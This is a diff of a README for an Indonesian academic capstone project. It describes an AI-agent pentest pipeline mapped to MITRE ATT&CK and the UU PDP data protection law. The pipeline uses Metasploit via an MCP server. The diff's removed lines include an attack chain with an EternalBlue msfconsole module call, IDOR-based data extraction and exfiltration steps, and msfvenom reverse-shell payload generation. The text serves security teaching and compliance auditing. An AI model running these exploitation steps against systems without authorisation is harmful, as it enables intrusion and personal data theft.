+     │
+     ▼
+7. CVE Exploit ➜ T1210 (Remote Exploit) ➜ Pasal 35, 36, 39, 67
 ```
 
 ---
 
-## 📊 MITRE ATT&CK Mapping
+## ⚖️ UU PDP Compliance (Indonesia)
 
-### Technique Coverage by Tactic
+### Coverage: 48/48 Pasal (100%!)
 
-| Tactic | Techniques | Contoh Teknik | UU PDP Articles |
-|--------|-----------|---------------|-----------------|
-| **Reconnaissance** | 8 | T1595 (Active Scanning) | Pasal 31, 38 |
-| **Initial Access** | 6 | T1078 (Valid Accounts), T1190 (Exploit Public App) | Pasal 23, 35, 36, 39, 65 |
-| **Discovery** | 30 | T1087 (Account Discovery), T1046 (Service Discovery) | Pasal 28, 31, 32, 38 |
-| **Credential Access** | 42 | T1539 (Steal Cookie), T1552 (Unsecured Creds) | Pasal 24, 25, 26, 35, 36, 39 |
-| **Privilege Escalation** | 25 | T1068 (Exploit for Priv Esc), T1098 (Account Manipulation) | Pasal 28, 35, 36, 39 |
-| **Defense Evasion** | 42 | T1070 (Indicator Removal), T1562 (Impair Defenses) | Pasal 31, 33, 35, 36, 37, 47, 49, 50, 53, 54 |
-| **Lateral Movement** | 18 | T1210 (Remote Services), T1021 (Remote Services) | Pasal 38, 39, 51 |
-| **Collection** | 28 | T1005 (Local System), T1213 (Info Repositories) | Pasal 16, 17, 18, 27, 35, 38 |
-| **Command & Control** | 22 | T1071 (App Layer Protocol), T1102 (Web Service) | Pasal 19, 31, 35, 38, 51 |
-| **Exfiltration** | 16 | T1567 (Over Web Service), T1041 (Over C2) | Pasal 35, 38, 45, 46, 55 |
-| **Impact** | 15 | T1486 (Data Encrypted), T1485 (Data Destruction) | Pasal 30, 35, 36, 41, 43, 44, 45, 46, 48, 57, 66, 67, 68, 69, 71, 73 |
-| **Execution** | 14 | T1059 (Command Interpreter), T1648 (Serverless) | Pasal 35, 36, 39 |
-| **Persistence** | 14 | T1136 (Create Account), T1133 (Remote Services) | Pasal 35, 36, 39, 51 |
-| **Resource Development** | 8 | T1583 (Acquire Infrastructure) | Pasal 38, 65 |
-
-### Attack Chain Example
-
-```
-Gray Box Pentest → MITRE ATT&CK Chain → UU PDP Mapping
-
-1. Login dengan staff credentials
-   → T1078 (Valid Accounts) [Initial Access]
-   → Pasal 23 (persetujuan), 35 (keamanan), 36 (langkah teknis), 39 (akses tidak sah), 65 (larangan memperoleh data)
-
-2. Enumerate user accounts
-   → T1087 (Account Discovery) [Discovery]
-   → Pasal 32 (hak akses subjek), 38 (perlindungan tidak sah), 39 (akses tidak sah)
-
-3. Test IDOR pada /api/v1/users/{id}
-   → T1210 (Remote Services Exploitation) [Lateral Movement]
-   → Pasal 38 (perlindungan tidak sah), 39 (akses tidak sah), 51 (kewajiban prosesor)
-
-4. Mass assignment: role=staff → role=admin
-   → T1068 (Exploitation for Privilege Escalation) [Privilege Escalation]
-   → Pasal 35 (keamanan data), 36 (langkah teknis), 39 (akses tidak sah)
-
-5. Extract user PII via IDOR
-   → T1213 (Data from Information Repositories) [Collection]
-   → Pasal 16 (pemrosesan data), 35 (keamanan data), 38 (perlindungan tidak sah)
-
-6. Exfiltrate large dataset
-   → T1567 (Exfiltration Over Web Service) [Exfiltration]
-   → Pasal 35 (keamanan), 38 (perlindungan), 45 (notifikasi), 46 (kegagalan), 55 (transfer data)
-
-7. Exploit known CVE (e.g., EternalBlue on exposed SMB)
-   → T1210 (Exploitation of Remote Services) [Lateral Movement]
-   → msfconsole_exploit(module="exploit/windows/smb/ms17_010_eternalblue")
-   → Pasal 35 (keamanan data), 36 (langkah teknis), 39 (akses tidak sah), 67 (pidana)
-```
-
----
-
-## ⚖️ UU PDP Compliance Mapping
-
-### Coverage: 48/48 Articles (100%)
-
-| Pasal | Topik | MITRE Techniques | Risk Description |
-|-------|-------|-----------------|------------------|
-| **Pasal 16** | Pemrosesan Data | 33 | Pengumpulan/pemrosesan data tanpa otorisasi |
-| **Pasal 17** | Data Visual (CCTV) | 2 | Screen/video capture tanpa persetujuan |
+| Pasal | Topik | MITRE Techniques | Risiko |
+|-------|-------|-----------------|--------|
+| **Pasal 16** | Pemrosesan Data | 33 | Ngumpulin data tanpa izin |
+| **Pasal 17** | Data Visual (CCTV) | 2 | Screenshot/capture tanpa persetujuan |
 | **Pasal 23** | Persetujuan | 1 | Akses tanpa persetujuan valid |
-| **Pasal 28** | Pemrosesan Terbatas | 25 | Pemrosesan melebihi tujuan awal |
-| **Pasal 31** | Perekaman Kegiatan | 119 | Penghapusan log/audit trail |
-| **Pasal 32** | Hak Akses Subjek | 9 | Penemuan akun/data tanpa otorisasi |
-| **Pasal 35** | Keamanan Data | 261 | Kegagalan melindungi data pribadi |
-| **Pasal 36** | Langkah Teknis | 159 | Tidak ada langkah teknis keamanan |
-| **Pasal 38** | Perlindungan Tidak Sah | 147 | Akses/pemrosesan tanpa otorisasi |
-| **Pasal 39** | Pencegahan Akses Tidak Sah | 126 | Akses tidak sah terhadap data pribadi |
-| **Pasal 46** | Notifikasi Kegagalan | 21 | Tidak ada notifikasi breach 3x24 jam |
-| **Pasal 57** | Sanksi Administratif | 20 | Pelanggaran dikenai sanksi administratif |
-| **Pasal 65-69** | Ketentuan Pidana | 27 | Pelanggaran pidana data pribadi |
-| **Pasal 71-73** | Sanksi Pidana | 9 | Pidana tambahan dan ganti rugi |
+| **Pasal 28** | Pemrosesan Terbatas | 25 | Pake data melebihi tujuan awal |
+| **Pasal 31** | Perekaman Kegiatan | 119 | Hapus log/audit trail |
+| **Pasal 32** | Hak Akses Subjek | 9 | Temuin akun/data tanpa otorisasi |
+| **Pasal 35** | Keamanan Data | 261 | Gagal lindungin data pribadi |
+| **Pasal 36** | Langkah Teknis | 159 | Gak ada langkah teknis keamanan |
+| **Pasal 38** | Perlindungan Tidak Sah | 147 | Akses data tanpa izin |
+| **Pasal 39** | Cegah Akses Tidak Sah | 126 | Data pribadi diakses orang tak berhak |
+| **Pasal 46** | Notifikasi Kegagalan | 21 | Gak notify breach 3x24 jam |
+| **Pasal 57** | Sanksi Administratif | 20 | Kena sanksi administratif |
+| **Pasal 65-69** | Ketentuan Pidana | 27 | Bisa kena pidana |
+| **Pasal 71-73** | Sanksi Pidana | 9 | Penjara + denda |
 
-### Legal Risk Matrix
+### Matriks Risiko Hukum
 
-| Severity | UU PDP Article | MITRE Tactic | Sanction |
-|----------|---------------|--------------|----------|
-| **Critical** | Pasal 67, 68, 69 | Impact | Pidana penjara + denda |
-| **High** | Pasal 35, 39, 46 | Initial Access, Exfiltration | Sanksi administratif + pidana |
-| **Medium** | Pasal 28, 31, 32, 38 | Discovery, Collection | Sanksi administratif |
-| **Low** | Pasal 16, 17, 23 | Reconnaissance | Peringatan administratif |
+| Severity | Pasal | Tactic MITRE | Sanksi |
+|----------|-------|--------------|--------|
+| 🔴 **Critical** | 67, 68, 69 | Impact | Pidana penjara + denda |
+| 🟠 **High** | 35, 39, 46 | Initial Access, Exfiltration | Sanksi adm + pidana |
+| 🟡 **Medium** | 28, 31, 32, 38 | Discovery, Collection | Sanksi administratif |
+| 🟢 **Low** | 16, 17, 23 | Reconnaissance | Peringatan tertulis |
+
+### Cara Kerja RAG untuk Compliance
+
+```
+Temuan Teknis                        UU PDP
+─────────────────                    ──────
+"Bisa akses data user lain via IDOR" ➜ ChromaDB ➜ Pasal 38, 39
+"Login tanpa CAPTCHA"               ➜ ChromaDB ➜ Pasal 35, 36
+"Stack trace muncul di error page"  ➜ ChromaDB ➜ Pasal 31, 35
+"Bisa baca file .env"               ➜ ChromaDB ➜ Pasal 35, 38
+```
 
 ---
 
-## 🎯 Gray Box Testing Workflow
+## 🚀 Setup & Cara Pakai
 
-### Setup (Sekali)
+### Prasyarat
 
 ```bash
-# 1. Setup credentials
-python run_graybox.py --setup
+# 1. Python 3.10+
+python3 --version
 
-# Atau edit langsung
-nano .env.graybox
+# 2. Virtual environment
+python3 -m venv .venv
+source .venv/bin/activate
+
+# 3. Install dependencies
+pip install langchain langchain-chroma langchain-community huggingface-hub
+pip install requests urllib3 python-dotenv pyyaml
+
+# 4. Security tools (pastikan terinstall)
+# nmap, nuclei, ffuf, sqlmap, dalfox, whatweb, subfinder
+sudo apt install nmap whatweb  # contoh
 ```
 
-### Execution (Tinggal Run)
+### Quick Start
 
 ```bash
-# Full pentest dengan auto-mapping
+# 1. Index UU PDP ke database (cuma sekali)
+python index_uu_pdp.py
+
+# 2. Setup kredensial gray box
+python run_graybox.py --setup
+
+# 3. Jalanin pentest full
 python run_graybox.py
 
-# Output:
-# ├── graybox-<chain>-report.md       # Full report
-# ├── graybox-<chain>-navigator.json  # ATT&CK Navigator layer
-# └── graybox-<chain>-chain.json      # Chain report JSON
+# 4. Baca hasil
+cat graybox-*-report.md
 ```
 
-### Phases
+### CLI Reference Lengkap
 
-```
-Phase 1: Reconnaissance (Automated)
-  ├── Subdomain enumeration → subfinder + crt.sh + dnsx + httpx
-  ├── Technology fingerprinting → whatweb + favicon + headers + DNS
-  ├── JavaScript reconnaissance → JS recon pipeline (9 phases)
-  ├── Hidden endpoint discovery → wellknown + leaks + error logs + FFUF
-  └── API discovery → Swagger + Kiterunner + Arjun
+| Perintah | Fungsi |
+|----------|--------|
+| `python run_graybox.py` | Jalanin pentest dengan kredensial tersimpan |
+| `python run_graybox.py --setup` | Setup kredensial interaktif |
+| `python run_graybox.py --status` | Cek status kredensial |
+| `python run_graybox.py --target URL --token TOKEN` | Run cepat tanpa setup |
+| `python run_graybox.py --proxy http://127.0.0.1:8080` | Run via Burp Suite |
+| `python index_uu_pdp.py` | Re-index UU PDP ke ChromaDB |
+| `python agent_orchestrator.py` | Jalanin orchestrator langsung |
+| `python scripts/mcp_metasploit.py` | Start Metasploit MCP server |
 
-Phase 2: Vulnerability Scanning (Automated)
-  ├── Nuclei CVE scanning → 1000+ templates + headless DOM testing
-  ├── SQL injection → SQLMap automated scanning
-  ├── XSS testing → Dalfox automated scanning
-  ├── Parameter reflection → XSS/open redirect candidates
-  ├── CORS misconfiguration → origin reflection, null, wildcard
-  ├── LFI/Path Traversal → lfimap automated testing
-  ├── SSTI → tplmap automated testing
-  └── Open Redirect → openredirex automated testing
+---
 
-Phase 3: Authentication & Authorization
-  ├── Authentication testing → JWT analysis, auth heartbeat
-  ├── IDOR/BOLA testing → object-level authorization on all endpoints
-  ├── Mass assignment → test all POST/PATCH endpoints
-  ├── Privilege escalation → horizontal + vertical testing
-  └── Two-account testing → attacker vs victim comparison
+## 📦 Deliverables
 
-Phase 4: Exploitation (Metasploit)
-  ├── Module search → find exploits for detected technology
-  ├── Payload generation → msfvenom (reverse shells, webshells, APKs)
-  ├── Exploit execution → run matched exploits (if in scope)
-  └── Post-exploitation → session management, system enumeration
+### Output yang Dihasilkan
 
-Phase 5: Advanced Testing
-  ├── WAF profiling & bypass → wafw00f + WAF engine + adaptive bypass
-  ├── HTTP smuggling → CL.TE, TE.CL, TE.TE + HTTP/3 downgrade
-  ├── Race condition → concurrent request testing (20-50 requests)
-  ├── WebSocket testing → connection without auth, message injection
-  ├── Error triggering → stack trace discovery via malformed input
-  ├── HTTP methods → allowed method enumeration
-  ├── GraphQL → introspection, field suggestions, CSRF via GET
-  └── Next.js → Server Action authorization bypass
+| File | Format | Isi |
+|------|--------|-----|
+| `graybox-<id>-report.md` | Markdown | Laporan pentest lengkap (MITRE + UU PDP) |
+| `graybox-<id>-report.pdf` | PDF | Laporan siap cetak (WeasyPrint) |
+| `graybox-<id>-navigator.json` | JSON | ATT&CK Navigator layer (heatmap visual) |
+| `graybox-<id>-chain.json` | JSON | Chain report (teknik, taktik, pasal) |
+| `Remediation_Roadmap.md` | Markdown | Roadmap perbaikan |
 
-Phase 6: Findings Validation & Scoring
-  ├── Save findings → memory.db persistence
-  ├── CVSS v3.1 scoring → proper vector strings
-  ├── Triage & prioritization → ROI scoring (payout/effort)
-  └── Pre-report quality check → 6-item validation gate
+### ATT&CK Navigator
 
-Phase 7: Legal Compliance Audit
-  ├── RAG-based legal mapping → technical finding → UU PDP article
-  ├── MITRE ATT&CK mapping → technique → tactic → sanctions
-  └── Export MITRE artifacts → Navigator layer + chain report
+Output `navigator.json` bisa di-load di [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/):
 
-Phase 8: Report Generation
-  ├── Markdown report → full pentest report with CVSS + MITRE + UU PDP
-  ├── PDF conversion → WeasyPrint professional styling
-  └── Display results → findings summary + artifact list
-```
+- 🔴 **Red:** Initial Access
+- 🟡 **Yellow:** Discovery
+- 🟣 **Magenta:** Credential Access
+- 🟠 **Orange:** Privilege Escalation
+- 🔵 **Cyan:** Collection
+- 🔷 **Blue:** Exfiltration
+- 🟤 **Purple:** Impact
 
 ---
 
 ## 🔄 Integrasi Sinergis (Project 4)
 
-### Sinergi Antar Modul
+### 4 Modul Terintegrasi
 
 ```
-┌─────────────┐     ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
-│  MODUL A    │     │  MODUL B    │     │  MODUL C    │     │  MODUL D    │
-│  SIEM/Wazuh │◀───▶│  Threat     │◀───▶│  AI Agent   │◀───▶│ Metasploit  │
-│             │     │  Hunting    │     │  Pentest    │     │ MCP Server  │
-└─────────────┘     └─────────────┘     └─────────────┘     └─────────────┘
-       │                    │                    │                    │
-       ▼                    ▼                    ▼                    ▼
-  Deteksi serangan    Investigasi IOC      Generate Sigma     Payload & Exploit
-  dari AI Agent       dari AI Agent        Rules + MITRE      Execution + Post-Exp
-  → Alert SIEM        → Threat Intel       → Detection Rules  → Session Mgmt
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│  📊 MODUL A  │    │  🕵️ MODUL B  │    │  🧠 MODUL C  │    │  💣 MODUL D  │
+│  SIEM/Wazuh  │◀──▶│  Threat      │◀──▶│  AI Agent    │◀──▶│  Metasploit  │
+│              │    │  Hunting     │    │  Pentest     │    │  MCP Server  │
+└──────┬───────┘    └──────┬───────┘    └──────┬───────┘    └──────┬───────┘
+       │                   │                   │                   │
+       ▼                   ▼                   ▼                   ▼
+  Deteksi serangan     Investigasi IOC      Generate Sigma      Payload & Exploit
+  dari AI Agent        dari AI Agent        Rules + MITRE       Execution + Post-Exp
+  ➜ Alert SIEM         ➜ Threat Intel       ➜ Detection Rules   ➜ Session Mgmt
 ```
 
 ### Alur Sinergi
 
-1. **AI Agent (Modul C)** menjalankan pentest → generate temuan dengan MITRE mapping
-2. **Metasploit MCP (Modul D)** mengeksekusi exploit untuk known CVE → payload generation & session management
-3. **Wazuh SIEM (Modul A)** mendeteksi serangan dari AI Agent melalui Sigma Rules
-4. **Threat Hunting (Modul B)** menggunakan IOC dari AI Agent untuk investigasi
-5. **Feedback loop:** Deteksi SIEM → validasi temuan → update AI Agent rules → refine exploit strategy
+1. **AI Agent (Modul C)** jalanin pentest ➜ generate temuan + MITRE mapping
+2. **Metasploit MCP (Modul D)** eksekusi exploit untuk CVE yang cocok
+3. **Wazuh SIEM (Modul A)** deteksi serangan dari AI Agent via Sigma Rules
+4. **Threat Hunting (Modul B)** pakai IOC dari AI Agent buat investigasi
+5. **Feedback loop:** SIEM detect ➜ validasi temuan ➜ update AI rules
 
 ---
 
 ## 📋 Rubrik Penilaian (Project 4)
 
 | Kriteria (Bobot) | Implementasi | Bukti |
-|------------------|-------------|-------|
-| **Integrasi Sistem (25%)** | AI Agent ↔ Wazuh SIEM ↔ Threat Hunting | Sigma Rules, IOC feed, alert correlation |
-| **Ketajaman Teknis (25%)** | MITRE ATT&CK mapping (333 techniques), 140+ MCP tools, Metasploit integration | Navigator layer, chain report, PoC, payload generation |
-| **Analisis Hukum PDP (20%)** | 48/48 UU PDP articles mapped, RAG-based legal audit | Legal mapping matrix, sanctions reference |
-| **Otomasi & Efisiensi (15%)** | Full 8-phase pipeline, 30+ automated tools, one-command execution | `/pentest` slash command, credential manager, anti-looping |
-| **Presentasi (15%)** | Dokumentasi lengkap, slide-ready | README.md, reports, quickstart guide |
+|-----------------|-------------|-------|
+| **Integrasi Sistem (25%)** | AI Agent ↔ Wazuh SIEM ↔ Threat Hunting ↔ Metasploit MCP | Sigma Rules, IOC feed, alert correlation, payload generation |
+| **Ketajaman Teknis (25%)** | MITRE ATT&CK v19.1 (75 tech), 30+ tools, Metasploit integration | Navigator layer, chain report, PoC, exploit execution |
+| **Analisis Hukum PDP (20%)** | 48/48 UU PDP articles, RAG-based (340 chunks) | Legal mapping matrix, sanctions reference, pasal citations |
+| **Otomasi & Efisiensi (15%)** | Full 8-phase pipeline, one-command execution, credential manager | `run_graybox.py`, anti-looping PTG, auto-report |
+| **Presentasi (15%)** | Dokumentasi lengkap, README, reports, slide-ready | README.md, DOKUMENTASI_SISTEM_v2.md |
 
 ---
 
-## 🚀 Deployment & Usage
+## 👥 Tim Pengembang
 
-### Prerequisites
-
-```bash
-# Python 3.x with virtual environment
-source .venv/bin/activate
-
-# Install dependencies
-pip install langchain langchain-chroma langchain-community huggingface-hub
-
-# Security tools (tersedia di sistem)
-# nmap, nuclei, ffuf, sqlmap, dalfox, whatweb, subfinder
-# msfconsole, msfvenom (Metasploit Framework 6.4.134)
-```
-
-### Quick Start
-
-```bash
-# 1. Index UU PDP (first time only)
-python index_uu_pdp.py
-
-# 2. Setup gray box credentials
-python run_graybox.py --setup
-
-# 3. Run full pentest workflow
-python run_graybox.py
-
-# 4. Review reports
-cat graybox-*-report.md
-```
-
-### CLI Reference
-
-| Command | Fungsi |
-|---------|--------|
-| `/pentest` | **FULL PIPELINE** — 8 phases: recon → vuln scan → auth → exploit → advanced → validate → legal → report |
-| `python run_graybox.py` | Run gray box pentest dengan stored credentials |
-| `python run_graybox.py --setup` | Interactive credential setup |
-| `python run_graybox.py --status` | Show credential status |
-| `python run_graybox.py --target URL --token TOKEN` | Quick run tanpa setup |
-| `python run_graybox.py --proxy http://127.0.0.1:8080` | Run dengan Burp Suite proxy |
-| `python index_uu_pdp.py` | Re-index UU PDP ke ChromaDB |
-| `python agent_orchestrator.py` | Run orchestrator langsung |
-| `python scripts/mcp_metasploit.py` | Start Metasploit MCP server (msfvenom + msfconsole) |
-
----
-
-## 📁 Output Artifacts
-
-### Reports
-
-| File | Format | Content |
-|------|--------|---------|
-| `graybox-<chain>-report.md` | Markdown | Full pentest report (MITRE + UU PDP) |
-| `graybox-<chain>-report.pdf` | PDF | Professional styled PDF report |
-| `graybox-<chain>-navigator.json` | JSON | ATT&CK Navigator layer (visual heatmap) |
-| `graybox-<chain>-chain.json` | JSON | Chain report (techniques, tactics, articles) |
-| `payloads/` | Binary | Generated Metasploit payloads (if used) |
-
-### ATT&CK Navigator
-
-Load `navigator.json` ke [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) untuk visual heatmap:
-
-- **Red:** Initial Access techniques
-- **Yellow:** Discovery techniques
-- **Magenta:** Credential Access
-- **Orange:** Privilege Escalation
-- **Cyan:** Collection
-- **Blue:** Exfiltration
-- **Purple:** Impact
+| Nama | Role | Kontribusi |
+|------|------|-----------|
+| **Vedara Alwi** | AI Agent Engineer | Orchestrator, MITRE Mapper, MCP integration, Tools Bridge |
+| _Anggota Kelompok 7_ | Security Team | Pentest execution, report generation, compliance audit |
 
 ---
 
 ## 📚 Referensi
 
 ### Framework & Standards
-
-- [MITRE ATT&CK Enterprise](https://attack.mitre.org/) — Framework threat intelligence
+- [MITRE ATT&CK Enterprise v19.1](https://attack.mitre.org/) — Threat intelligence framework
+- [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) — Visual technique mapping
 - [OWASP API Security Top 10](https://owasp.org/API-Security/) — API vulnerability reference
 - [CWE Database](https://cwe.mitre.org/) — Common Weakness Enumeration
 
 ### Legal
-
-- UU No. 27 Tahun 2022 — Perlindungan Data Pribadi
+- **UU No. 27 Tahun 2022** — Perlindungan Data Pribadi (PDP)
 - PP No. 71 Tahun 2019 — Penyelenggaraan Sistem Elektronik
-- Perkominfo No. 20 Tahun 2016 — Perlindungan Data Pribadi
 
 ### Tools
-
 - [Nmap](https://nmap.org/) — Network scanner
-- [Nuclei](https://nuclei.projectdiscovery.io/) — Vulnerability scanner
+- [Nuclei](https://nuclei.projectdiscovery.io/) — Vulnerability scanner (1000+ CVE templates)
 - [FFUF](https://github.com/ffuf/ffuf) — Web fuzzer
-- [SQLMap](https://sqlmap.org/) — SQL injection tool
+- [SQLMap](https://sqlmap.org/) — SQL injection automation
 - [Dalfox](https://github.com/hahwul/dalfox) — XSS scanner
-- [Metasploit Framework](https://www.metasploit.com/) — Exploitation framework (msfvenom + msfconsole)
-- [ChromaDB](https://www.trychroma.com/) — Vector database
-
-
-## 📄 License
-
-Project ini dibuat untuk keperluan akademik Capstone Project Cybersecurity 2026.
+- [Metasploit Framework](https://www.metasploit.com/) — Exploitation framework
+- [ChromaDB](https://www.trychroma.com/) — Vector database for RAG
 
 ---
 
-**Project Status:** 🟢 *Production Ready — Full 8-Phase Automated Pipeline (30+ Tools)*
-**Last Updated:** May 17, 2026
+## 📄 Lisensi
+
+Project ini dibuat untuk keperluan **akademik** — Capstone Project Cybersecurity 2026, Program Profesi Keamanan Siber.
+
+**Peringatan:** Tools ini dirancang untuk pengujian keamanan yang etis dan legal. Hanya gunakan pada sistem yang lo miliki atau memiliki izin tertulis untuk diuji.
+
+---
+
+**Project Status:** 🟢 *Production Ready — Full 8-Phase Automated Pipeline (30+ Tools, 15 MITRE Tactics, 48 UU PDP Articles)*
+**Last Updated:** May 31, 2026
